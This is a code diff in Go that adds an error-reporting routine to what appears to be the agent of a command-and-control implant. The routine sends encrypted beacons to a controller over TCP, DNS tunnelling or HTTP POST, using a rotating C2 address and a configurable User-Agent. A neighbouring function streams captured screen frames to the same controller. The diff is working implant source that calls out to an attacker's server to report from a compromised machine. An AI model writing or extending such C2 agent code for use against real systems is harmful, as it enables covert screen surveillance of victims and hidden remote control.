@@ -14,6 +14,45 @@ import (
 	"strings"
 )
 
+func sendScreenStreamError(msg string) {
+	req := BeaconRequest{
+		UUID: agentUUID,
+		Results: []TaskResult{{
+			Type:  "screen_stream_error",
+			Error: msg,
+		}},
+	}
+	body, _ := encodeBeacon(req)
+	sendBody, kind, _, ok := buildBeaconEnvelope(body)
+	if !ok || kind != agentFrameEncrypted {
+		return
+	}
+	switch Protocol {
+	case "tcp":
+		sendTCPBeacon(sendBody)
+	case "dns":
+		sendDNSBeacon(sendBody)
+	default:
+		// Route through the regular beacon POST so the error reaches the
+		// server's generic result processing and appears in its logs.
+		screenURL := c2URLAtIndex(int(currentC2Idx.Load()))
+		if !strings.HasPrefix(screenURL, "http://") && !strings.HasPrefix(screenURL, "https://") {
+			screenURL = "http://" + screenURL
+		}
+		httpReq, err := http.NewRequest("POST", screenURL+"/api/v1/beacon", bytes.NewReader(sendBody))
+		if err != nil {
+			return
+		}
+		httpReq.Header.Set("Content-Type", "application/json")
+		httpReq.Header.Set("User-Agent", getActiveUserAgentFromConfig())
+		resp, err := client.Do(httpReq)
+		if err == nil {
+			io.Copy(io.Discard, resp.Body)
+			resp.Body.Close()
+		}
+	}
+}
+
 func sendScreenFrame(data []byte) {
 	b64 := base64.StdEncoding.EncodeToString(data)
 	req := BeaconRequest{
